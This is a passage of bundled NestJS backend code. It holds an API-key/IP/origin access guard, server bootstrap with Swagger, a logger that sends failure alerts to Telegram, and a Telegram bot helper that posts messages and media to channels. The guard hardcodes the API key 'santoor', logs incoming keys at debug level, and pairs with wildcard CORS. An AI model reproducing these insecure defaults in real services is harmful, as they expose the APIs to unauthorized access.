let ApiKeyOrIpOrOriginGuard = ApiKeyOrIpOrOriginGuard_1 = class ApiKeyOrIpOrOriginGuard {
    constructor() {
        this.logger = new common_1.Logger(ApiKeyOrIpOrOriginGuard_1.name);
    }
    canActivate(context) {
        const request = context.switchToHttp().getRequest();
        const apiKey = request.headers['x-api-key']?.toString() ||
            request.query['apiKey']?.toString();
        const clientIp = (request.ip || request.connection.remoteAddress)?.replace('::ffff:', '');
        const origin = request.headers.origin;
        this.logger.debug(`Incoming request:`);
        this.logger.debug(`→ API Key: ${apiKey || 'NONE'}`);
        this.logger.debug(`→ Client IP: ${clientIp}`);
        this.logger.debug(`→ Origin: ${origin || 'NONE'}`);
        let passedReason = null;
        if (apiKey && apiKey === "santoor") {
            this.logger.debug(`✅ API Key matched`);
            passedReason = 'API key valid';
        }
        else {
            this.logger.debug(`❌ API Key mismatch`);
        }
        if (!passedReason && ALLOWED_IPS.includes(clientIp)) {
            this.logger.debug(`✅ IP allowed`);
            passedReason = 'IP allowed';
        }
        else if (!passedReason) {
            this.logger.debug(`❌ IP not allowed`);
        }
        if (!passedReason && origin && ALLOWED_ORIGINS.includes(origin)) {
            this.logger.debug(`✅ Origin allowed`);
            passedReason = 'Origin allowed';
        }
        else if (!passedReason) {
            this.logger.debug(`❌ Origin not allowed`);
        }
        if (passedReason) {
            this.logger.debug(`Access granted because: ${passedReason}`);
            return true;
        }
        this.logger.warn(`❌ Access denied — no condition satisfied`);
        throw new common_1.UnauthorizedException('Access denied: No valid API key, IP, or Origin');
    }
};
exports.ApiKeyOrIpOrOriginGuard = ApiKeyOrIpOrOriginGuard;
exports.ApiKeyOrIpOrOriginGuard = ApiKeyOrIpOrOriginGuard = ApiKeyOrIpOrOriginGuard_1 = __decorate([
    (0, common_1.Injectable)()
], ApiKeyOrIpOrOriginGuard);


/***/ }),

/***/ "./src/interfaces/telegram.ts":
/*!************************************!*\
  !*** ./src/interfaces/telegram.ts ***!
  \************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PrivacyLevelEnum = void 0;
var PrivacyLevelEnum;
(function (PrivacyLevelEnum) {
    PrivacyLevelEnum["everybody"] = "everybody";
    PrivacyLevelEnum["contacts"] = "contacts";
    PrivacyLevelEnum["nobody"] = "nobody";
})(PrivacyLevelEnum || (exports.PrivacyLevelEnum = PrivacyLevelEnum = {}));


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__webpack_require__(/*! reflect-metadata */ "reflect-metadata");
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const app_module_1 = __webpack_require__(/*! ./app.module */ "./src/app.module.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
async function bootstrap() {
    const app = await core_1.NestFactory.create(app_module_1.AppModule);
    const config = new swagger_1.DocumentBuilder()
        .setTitle('NestJS and Express API')
        .setDescription('API documentation')
        .setVersion('1.0')
        .addApiKey({ type: 'apiKey', name: 'x-api-key', in: 'header' }, 'x-api-key')
        .build();
    app.use((req, res, next) => {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');
        next();
    });
    app.enableCors({
        allowedHeaders: "*",
        origin: "*"
    });
    const document = swagger_1.SwaggerModule.createDocument(app, config, {
        deepScanRoutes: true,
    });
    document.components ??= {};
    document.components.securitySchemes ??= {};
    document.security = [{ 'x-api-key': [] }];
    fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
    swagger_1.SwaggerModule.setup('apim', app, document, {
        swaggerOptions: {
            persistAuthorization: true,
            authAction: {
                'x-api-key': {
                    name: 'x-api-key',
                    schema: { type: 'apiKey', in: 'header', name: 'x-api-key' },
                    value: process.env.API_KEY || 'santoor',
                },
            },
        },
    });
    mongoose_1.default.set('debug', true);
    app.useGlobalPipes(new common_1.ValidationPipe({
        transform: true,
        transformOptions: {
            enableImplicitConversion: true
        },
    }));
    process.on('unhandledRejection', (reason, promise) => {
        console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    });
    process.on('uncaughtException', (reason, promise) => {
        console.log('Uncaught Exception at:');
        console.error(promise, reason);
    });
    let isShuttingDown = false;
    const shutdown = async (signal) => {
        if (isShuttingDown)
            return;
        isShuttingDown = true;
        console.log(`${signal} received`);
        console.log("CTS exit Request");
        await app.close();
        process.exit(0);
    };
    process.on('exit', async () => {
        console.log('Application closed');
    });
    process.on('SIGINT', async () => {
        console.log('SIGINT received');
        await shutdown('SIGINT');
    });
    process.on('SIGTERM', async () => {
        console.log('SIGTERM received');
        await shutdown('SIGTERM');
    });
    process.on('SIGQUIT', async () => {
        console.log('SIGQUIT received');
        await shutdown('SIGQUIT');
    });
    await app.init();
    await app.listen(process.env.PORT || 9000);
    console.log(`Application is running on: ${await app.getUrl()}`);
}
bootstrap();


/***/ }),

/***/ "./src/middlewares/logger.middleware.ts":
/*!**********************************************!*\
  !*** ./src/middlewares/logger.middleware.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.LoggerMiddleware = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const fetchWithTimeout_1 = __webpack_require__(/*! ../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ../utils/logbots */ "./src/utils/logbots.ts");
let LoggerMiddleware = class LoggerMiddleware {
    constructor() {
        this.logger = new common_1.Logger('HTTP');
    }
    use(req, res, next) {
        const { method, originalUrl, baseUrl } = req;
        const userAgent = req.get('user-agent') || '';
        const ip = req.ip;
        const excludedEndpoints = [
            '/sendtochannel',
            '/favicon.',
            '/tgsignup',
            '/timestamps',
        ];
        const isExcluded = (url) => excludedEndpoints.some((endpoint) => url.startsWith(endpoint));
        if (!isExcluded(originalUrl) && originalUrl !== '/') {
            res.on('finish', () => {
                const { statusCode } = res;
                const contentLength = res.get('content-length');
                if (statusCode >= 500) {
                    (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}\nService:${process.env.serviceName}\n\nFailed - ${originalUrl} with ${statusCode}`)}`);
                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 400) {
                    (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}\nService:${process.env.serviceName}\n\nFailed - ${originalUrl} with ${statusCode}`)}`);
                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 300) {
                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else {
                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
            });
            res.on('error', (error) => {
                const errorDetails = (0, parseError_1.parseError)(error, process.env.clientId);
                (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId ? process.env.clientId : process.env.serviceName} Failed :: ${originalUrl} with ${errorDetails.message}`)}`);
            });
        }
        else {
            if (originalUrl.includes('Video')) {
                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);
            }
        }
        next();
    }
};
exports.LoggerMiddleware = LoggerMiddleware;
exports.LoggerMiddleware = LoggerMiddleware = __decorate([
    (0, common_1.Injectable)()
], LoggerMiddleware);


/***/ }),

/***/ "./src/utils/TelegramBots.config.ts":
/*!******************************************!*\
  !*** ./src/utils/TelegramBots.config.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotConfig = exports.ChannelCategory = void 0;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const form_data_1 = __importDefault(__webpack_require__(/*! form-data */ "form-data"));
var ChannelCategory;
(function (ChannelCategory) {
    ChannelCategory["CLIENT_UPDATES"] = "CLIENT_UPDATES";
    ChannelCategory["USER_WARNINGS"] = "USER_WARNINGS";
    ChannelCategory["VC_WARNINGS"] = "VC_WARNINGS";
    ChannelCategory["USER_REQUESTS"] = "USER_REQUESTS";
    ChannelCategory["VC_NOTIFICATIONS"] = "VC_NOTIFICATIONS";
    ChannelCategory["CHANNEL_NOTIFICATIONS"] = "CHANNEL_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_NOTIFICATIONS"] = "ACCOUNT_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_LOGIN_FAILURES"] = "ACCOUNT_LOGIN_FAILURES";
    ChannelCategory["PROMOTION_ACCOUNT"] = "PROMOTION_ACCOUNT";
    ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
    ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
    ChannelCategory["SAVED_MESSAGES"] = "SAVED_MESSAGES";
    ChannelCategory["HTTP_FAILURES"] = "HTTP_FAILURES";
    ChannelCategory["UNVDS"] = "UNVDS";
    ChannelCategory["PROM_LOGS1"] = "PROM_LOGS1";
    ChannelCategory["PROM_LOGS2"] = "PROM_LOGS2";
})(ChannelCategory || (exports.ChannelCategory = ChannelCategory = {}));
class BotConfig {
    constructor() {
        this.categoryMap = new Map();
        this.initialized = false;
        this.initializing = false;
        this.initPromise = null;
        this.initRetries = 0;
        this.MAX_RETRIES = 3;
        this.RETRY_DELAY = 2000;
        this.initPromise = this.initialize();
    }
    static getInstance() {
        if (!BotConfig.instance) {
            BotConfig.instance = new BotConfig();
        }
        return BotConfig.instance;
    }
    static async initializeAndGetInstance() {
        const instance = BotConfig.getInstance();
        await instance.ready();
        return instance;
    }
    async ready() {
        if (this.initialized) {
            return;
        }
        if (!this.initPromise) {
            this.initPromise = this.initialize();
        }
        return this.initPromise;
    }
    async initialize() {
        if (this.initialized || this.initializing) {
            return;
        }
        try {
            this.initializing = true;
            console.debug('Initializing Telegram channel configuration...');
            const envKeys = Object.keys(process.env).filter(key => key.startsWith('TELEGRAM_CHANNEL_CONFIG_'));
            for (const key of envKeys) {
                const value = process.env[key];
                if (!value)
                    continue;
                try {
                    const [channelId, description = '', botTokensStr] = value.split('::');
                    const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);
                    if (!channelId || !botTokens || botTokens.length === 0) {
                        console.warn(`Invalid configuration for ${key}: missing channelId or botTokens`);
                        continue;
                    }
                    const category = this.getCategoryFromDescription(description);
                    if (!category) {
                        console.warn(`Invalid category in description for ${key}: ${description}`);
                        continue;
                    }
                    const botUsernames = [];
                    for (const token of botTokens) {
                        try {
                            const username = await this.fetchUsername(token);
                            if (!username) {
                                console.warn(`Invalid bot token in ${category}`);
                                continue;
                            }
                            botUsernames.push(username);
                        }
                        catch (error) {
                            console.error(`Error fetching username for token in ${category}:`, error);
                        }
                    }
                    if (botUsernames.length === 0) {
                        console.warn(`No valid bot usernames found for ${category}`);
                        continue;
                    }
                    this.categoryMap.set(category, {
                        botTokens,
                        botUsernames,
                        lastUsedIndex: -1,
                        channelId,
                    });
                }
                catch (error) {
                    console.error(`Error processing configuration for ${key}:`, error);
                }
            }
            await this.initializeBots();
            this.initialized = true;
            console.info(`BotConfig initialized successfully with ${this.categoryMap.size} categories.`);
        }
        catch (error) {
            console.error('Failed to initialize BotConfig:', error);
            if (this.initRetries < this.MAX_RETRIES) {
                this.initRetries++;
                console.info(`Retrying initialization (attempt ${this.initRetries}/${this.MAX_RETRIES})...`);
                this.initializing = false;
                this.initPromise = null;
                await new Promise(resolve => setTimeout(resolve, this.RETRY_DELAY));
                return this.initialize();
            }
            else {
                console.error(`Failed to initialize after ${this.MAX_RETRIES} attempts`);
                throw error;
            }
        }
        finally {
            this.initializing = false;
        }
    }
    getCategoryFromDescription(desc) {
        if (!desc)
            return null;
        const normalized = desc.trim().toUpperCase();
        return Object.values(ChannelCategory).find(cat => normalized.includes(cat) || cat.includes(normalized)) ?? null;
    }
    async fetchUsername(token) {
        if (!token || typeof token !== 'string' || token.length < 10) {
            return '';
        }
        try {
            const res = await axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
                timeout: 5000
            });
            return res.data?.ok ? res.data.result.username : '';
        }
        catch (error) {
            console.error('Error fetching bot username:', error);
            return '';
        }
    }
    async getBotUsername(category) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botUsernames.length === 0) {
            throw new Error(`No valid bots configured for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
        return data.botUsernames[data.lastUsedIndex];
    }
    async getChannelId(category) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data) {
            throw new Error(`No configuration found for ${category}`);
        }
        return data.channelId;
    }
    async getBotAndChannel(category) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botUsernames.length === 0) {
            throw new Error(`No valid bots configured for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
        return {
            username: data.botUsernames[data.lastUsedIndex],
            channelId: data.channelId,
            token: data.botTokens[data.lastUsedIndex],
        };
    }
    async sendMessage(category, message, options = {}) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botTokens.length === 0) {
            throw new Error(`No valid bots configured for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
        const botIndex = data.lastUsedIndex;
        const token = data.botTokens[botIndex];
        const channelId = data.channelId;
        const params = new URLSearchParams({
            chat_id: channelId,
            text: `${process.env.clientId?.toUpperCase()}:\n\n${message}`,
        });
        if (options.parseMode)
            params.append('parse_mode', options.parseMode);
        if (options.disableWebPagePreview)
            params.append('disable_web_page_preview', 'true');
        if (options.disableNotification)
            params.append('disable_notification', 'true');
        if (options.replyToMessageId)
            params.append('reply_to_message_id', options.replyToMessageId.toString());
        if (options.allowSendingWithoutReply)
            params.append('allow_sending_without_reply', 'true');
        if (options.protectContent)
            params.append('protect_content', 'true');
        if (options.linkPreviewOptions) {
            const { isDisabled, url, preferSmallMedia, preferLargeMedia, showAboveText } = options.linkPreviewOptions;
            if (isDisabled)
                params.append('disable_web_page_preview', 'true');
            if (url)
                params.append('link_preview_url', url);
            if (preferSmallMedia)
                params.append('prefer_small_media', 'true');
            if (preferLargeMedia)
                params.append('prefer_large_media', 'true');
            if (showAboveText)
                params.append('show_above_text', 'true');
        }
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        try {
            const response = await axios_1.default.post(url, params, {
                timeout: 10000
            });
            return response.data?.ok === true;
        }
        catch (error) {
            console.error(`Failed to send message to ${channelId} using bot at index ${botIndex}:`, error);
            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
                console.debug(`Retrying with next available bot for ${category}`);
                data.lastUsedIndex = botIndex;
                return this.sendMessage(category, message, options);
            }
            return false;
        }
    }
    async sendPhoto(category, photo, options = {}) {
        return this.sendMedia(category, 'sendPhoto', photo, options);
    }
    async sendVideo(category, video, options = {}) {
        return this.sendMedia(category, 'sendVideo', video, options);
    }
    async sendAudio(category, audio, options = {}) {
        return this.sendMedia(category, 'sendAudio', audio, options);
    }
    async sendDocument(category, document, options = {}) {
        return this.sendMedia(category, 'sendDocument', document, options);
    }
    async sendVoice(category, voice, options = {}) {
        return this.sendMedia(category, 'sendVoice', voice, options);
    }
    async sendVideoNote(category, videoNote, options = {}) {
        return this.sendMedia(category, 'sendVideoNote', videoNote, options);
    }
    async sendAnimation(category, animation, options = {}) {
        return this.sendMedia(category, 'sendAnimation', animation, options);
    }
    async sendSticker(category, sticker, options = {}) {
        return this.sendMedia(category, 'sendSticker', sticker, options);
    }
    async sendMediaGroup(category, media, options = {}) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botTokens.length === 0) {
            throw new Error(`No valid bots configured for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
        const botIndex = data.lastUsedIndex;
        const token = data.botTokens[botIndex];
        const channelId = data.channelId;
        const formData = new form_data_1.default();
        formData.append('chat_id', channelId);
        const mediaArray = [];
        for (let i = 0; i < media.length; i++) {
            const item = media[i];
            const mediaObj = {
                type: item.type,
                media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,
            };
            mediaObj.caption = `${process.env.clientId.toUpperCase()}:\n\n${item.caption || ''}`;
            if (item.parseMode)
                mediaObj.parse_mode = item.parseMode;
            if (item.hasSpoiler)
                mediaObj.has_spoiler = true;
            if (item.type === 'video') {
                if (item.duration)
                    mediaObj.duration = item.duration;
                if (item.width)
                    mediaObj.width = item.width;
                if (item.height)
                    mediaObj.height = item.height;
                if (item.supportsStreaming)
                    mediaObj.supports_streaming = true;
            }
            if (item.type === 'audio') {
                if (item.duration)
                    mediaObj.duration = item.duration;
                if (item.performer)
                    mediaObj.performer = item.performer;
                if (item.title)
                    mediaObj.title = item.title;
            }
            if (item.type === 'document') {
                if (item.thumbnail && Buffer.isBuffer(item.thumbnail)) {
                    mediaObj.thumbnail = `attach://thumb${i}`;
                }
            }
            mediaArray.push(mediaObj);
            if (Buffer.isBuffer(item.media)) {
                let filename = `file${i}`;
                if (item.extension) {
                    filename = `file${i}.${item.extension}`;
                }
                else {
                    switch (item.type) {
                        case 'photo':
                            filename = `file${i}.jpg`;
                            break;
                        case 'video':
                            filename = `file${i}.mp4`;
                            break;
                        case 'audio':
                            filename = `file${i}.mp3`;
                            break;
                        case 'document':
                            filename = `file${i}.bin`;
                            break;
                    }
                }
                formData.append(`file${i}`, item.media, filename);
            }
            if (item.type === 'document' && item.thumbnail && Buffer.isBuffer(item.thumbnail)) {
                formData.append(`thumb${i}`, item.thumbnail, `thumb${i}.jpg`);
            }
        }
        formData.append('media', JSON.stringify(mediaArray));
        if (options.disableNotification)
            formData.append('disable_notification', 'true');
        if (options.replyToMessageId)
            formData.append('reply_to_message_id', options.replyToMessageId.toString());
        if (options.allowSendingWithoutReply)
            formData.append('allow_sending_without_reply', 'true');
        if (options.protectContent)
            formData.append('protect_content', 'true');
        const url = `https://api.telegram.org/bot${token}/sendMediaGroup`;
        try {
            const response = await axios_1.default.post(url, formData, {
                timeout: 30000,
                headers: {
                    ...formData.getHeaders(),
                },
            });
            return response.data?.ok === true;
        }
        catch (error) {
            console.error(`Failed to send media group to ${channelId} using bot at index ${botIndex}:`, error);
            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
                console.debug(`Retrying with next available bot for ${category}`);
                data.lastUsedIndex = botIndex;
                return this.sendMediaGroup(category, media, options);
            }
            return false;
        }
    }
    async sendMedia(category, method, media, options = {}) {
        await this.ensureInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botTokens.length === 0) {
            throw new Error(`No valid bots configured for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
        const botIndex = data.lastUsedIndex;
        const token = data.botTokens[botIndex];
        const channelId = data.channelId;
        const formData = new form_data_1.default();
        formData.append('chat_id', channelId);
        const mediaField = method.replace('send', '').toLowerCase();
        if (Buffer.isBuffer(media)) {
            formData.append(mediaField, media, `${mediaField}.dat`);
        }
        else {
            formData.append(mediaField, media);
        }
        if (options.caption)
            formData.append('caption', `${process.env.clientId.toUpperCase()}:\n\n${options.caption}`);
        if (options.parseMode)
            formData.append('parse_mode', options.parseMode);
        if (options.disableNotification)
            formData.append('disable_notification', 'true');
        if (options.replyToMessageId)
            formData.append('reply_to_message_id', options.replyToMessageId.toString());
        if (options.allowSendingWithoutReply)
            formData.append('allow_sending_without_reply', 'true');
        if (options.protectContent)
            formData.append('protect_content', 'true');
        if (options.hasSpoiler)
            formData.append('has_spoiler', 'true');
        if (method === 'sendVideo') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.width)
                formData.append('width', options.width.toString());
            if (options.height)
                formData.append('height', options.height.toString());
            if (options.supportsStreaming)
                formData.append('supports_streaming', 'true');
            if (options.thumbnail) {
                if (Buffer.isBuffer(options.thumbnail)) {
                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
                }
                else {
                    formData.append('thumbnail', options.thumbnail);
                }
            }
        }
        if (method === 'sendAudio') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.performer)
                formData.append('performer', options.performer);
            if (options.title)
                formData.append('title', options.title);
            if (options.thumbnail) {
                if (Buffer.isBuffer(options.thumbnail)) {
                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
                }
                else {
                    formData.append('thumbnail', options.thumbnail);
                }
            }
        }
        if (method === 'sendDocument') {
            if (options.thumbnail) {
                if (Buffer.isBuffer(options.thumbnail)) {
                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
                }
                else {
                    formData.append('thumbnail', options.thumbnail);
                }
            }
            if (options.disableContentTypeDetection)
                formData.append('disable_content_type_detection', 'true');
        }
        if (method === 'sendVoice') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
        }
        if (method === 'sendVideoNote') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.length)
                formData.append('length', options.length.toString());
            if (options.thumbnail) {
                if (Buffer.isBuffer(options.thumbnail)) {
                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
                }
                else {
                    formData.append('thumbnail', options.thumbnail);
                }
            }
        }
        if (method === 'sendAnimation') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.width)
                formData.append('width', options.width.toString());
            if (options.height)
                formData.append('height', options.height.toString());
            if (options.thumbnail) {
                if (Buffer.isBuffer(options.thumbnail)) {
                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
                }
                else {
                    formData.append('thumbnail', options.thumbnail);
                }
            }
        }
        if (method === 'sendSticker') {
            if (options.emoji)
                formData.append('emoji', options.emoji);
        }
        const url = `https://api.telegram.org/bot${token}/${method}`;
        try {
            const response = await axios_1.default.post(url, formData, {
                timeout: 30000,
                headers: {
                    ...formData.getHeaders(),
                },
            });
            return response.data?.ok === true;
        }
        catch (error) {
            console.error(`Failed to send ${method} to ${channelId} using bot at index ${botIndex}:`, error);
            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
                console.debug(`Retrying with next available bot for ${category}`);
                data.lastUsedIndex = botIndex;
                return this.sendMedia(category, method, media, options);
            }
            return false;
        }
    }
    async initializeBots() {
        console.debug('Initializing bots with /start command...');
        const initPromises = [];
        for (const [category, data] of this.categoryMap) {
            for (const token of data.botTokens) {
                const promise = (async () => {
                    try {
                        const botInfo = await axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
                            timeout: 5000
                        });
                        if (!botInfo.data?.ok) {
                            console.error(`Failed to get bot info for ${category}`);
                            return;
                        }
                        console.debug(`Successfully initialized bot for ${category}`);
                    }
                    catch (error) {
                        console.error(`Failed to initialize bot for ${category}:`, error);
                    }
                })();
                initPromises.push(promise);
            }
        }
        await Promise.allSettled(initPromises);
    }
    async ensureInitialized() {
        if (!this.initialized) {
            await this.ready();
            if (!this.initialized) {
                throw new Error('BotConfig initialization failed. Unable to proceed.');
            }
        }
    }
    async hasCategory(category) {
        await this.ensureInitialized();
        return this.categoryMap.has(category);
    }
    async getConfiguredCategories() {
        await this.ensureInitialized();
        return Array.from(this.categoryMap.keys());
    }
}
exports.BotConfig = BotConfig;


/***/ }),

/***/ "./src/utils/common.ts":
/*!*****************************!*\
  !*** ./src/utils/common.ts ***!
  \*****************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.defaultMessages = exports.defaultReactions = void 0;
exports.sleep = sleep;
exports.contains = contains;
exports.toBoolean = toBoolean;
exports.fetchNumbersFromString = fetchNumbersFromString;
exports.areJsonsNotSame = areJsonsNotSame;
exports.mapToJson = mapToJson;
exports.shouldMatch = shouldMatch;
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function contains(str, arr) {
    if (typeof str !== 'string' || !Array.isArray(arr) || arr.length === 0)
        return false;
    const normalizedStr = str.trim().toLowerCase();
    return arr.some(element => typeof element === 'string' &&
        element.trim() !== '' &&
        normalizedStr.includes(element.trim().toLowerCase()));
}
function toBoolean(value) {
    if (value === null || value === undefined)
        return false;
    if (typeof value === 'string') {
        const normalizedValue = value.toLowerCase().trim();
        return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';
    }
    if (typeof value === 'number') {
        return value !== 0;
    }
    return value;
}
function fetchNumbersFromString(inputString) {
    if (!inputString)
        return '';
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    return matches ? matches.join('') : '';
}
exports.defaultReactions = Object.freeze([
    '❤', '🔥', '👏', '🥰', '😁', '🤔',
    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
    '🤣', '💔', '🏆', '😭', '😴', '👍',
    '🌚', '⚡', '🍌', '😐', '💋', '👻',
    '👀', '🙈', '🤝', '🤗', '🆒',
    '🗿', '🙉', '🙊', '🤷', '👎'
]);
exports.defaultMessages = Object.freeze([
    "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "10", "11", "12", "13", "14", "15",
    "16", "17", "18", "19", "20", "21"
]);
function areJsonsNotSame(json1, json2) {
    const keysToIgnore = ['id', '_id', 'createdAt', 'updatedAt', 'timestamp', 'time', 'date', 'timeStamp', 'created_at', 'updated_at'];
    const MAX_DEPTH = 10;
    function compare(obj1, obj2, path = '', depth = 0) {
        if (depth > MAX_DEPTH) {
            console.log(`[DEPTH LIMIT] Reached max depth at path: ${path}`);
            return obj1 !== obj2;
        }
        if (obj1 === null || obj1 === undefined || obj2 === null || obj2 === undefined) {
            if (obj1 !== obj2) {
                console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);
                return true;
            }
            return false;
        }
        if (typeof obj1 !== typeof obj2) {
            console.log(`[MISMATCH] ${path}: type ${typeof obj1} !== ${typeof obj2}`);
            return true;
        }
        if (typeof obj1 !== 'object') {
            if (obj1 !== obj2) {
                console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);
                return true;
            }
            return false;
        }
        if (Array.isArray(obj1) && Array.isArray(obj2)) {
            if (obj1.length !== obj2.length) {
                console.log(`[MISMATCH] ${path}: array length ${obj1.length} !== ${obj2.length}`);
                return true;
            }
            for (let i = 0; i < obj1.length; i++) {
                const arrayPath = path ? `${path}[${i}]` : `[${i}]`;
                if (compare(obj1[i], obj2[i], arrayPath, depth + 1)) {
                    return true;
                }
            }
            return false;
        }
        if (Array.isArray(obj1) || Array.isArray(obj2)) {
            console.log(obj1, obj2);
            console.log(`[MISMATCH] ${path}: one is array, other is not`);
            return true;
        }
        const record1 = obj1;
        const record2 = obj2;
        const keys1 = Object.keys(record1).filter(key => !keysToIgnore.includes(key));
        const keys2 = Object.keys(record2).filter(key => !keysToIgnore.includes(key));
        if (keys1.length !== keys2.length) {
            console.log(`[MISMATCH] ${path}: different key count ${keys1.length} !== ${keys2.length}`);
